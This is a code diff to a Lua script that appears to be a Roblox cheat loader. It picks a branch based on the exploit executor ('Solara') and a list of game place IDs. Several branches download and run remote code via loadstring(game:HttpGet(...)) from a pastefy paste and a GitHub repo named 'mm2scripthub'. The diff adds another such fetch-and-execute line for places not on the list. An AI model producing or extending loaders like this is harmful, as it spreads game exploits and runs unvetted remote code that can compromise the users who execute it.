@@ -3,7 +3,7 @@ local allowedPlaceIds = {
     [335132309] = true,
     [636649648] = true,
     [5928494131] = true,
-    [80469437126309] = true
+    [80469437126309] = true,
     [97598239454123] = true
 }
 
@@ -33,13 +33,12 @@ local function solara()
     loadstring(game:HttpGet("https://pastefy.app/zbwRGXhT/raw"))()
 end
 
--- Check for Solara first using getExecutor()
 if getExecutor() == "Solara" then
     task.spawn(solara)
 elseif forcedExecutors[getExecutor()] then
     task.spawn(firstScript)
-elseif allowedPlaceIds[game.PlaceId] then
-    task.spawn(secondScript)
+elseif not allowedPlaceIds[game.PlaceId] then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2scripthub/mm2/refs/heads/main/ahh"))()
 else
-    task.spawn(firstScript)
+    task.spawn(secondScript)
 end
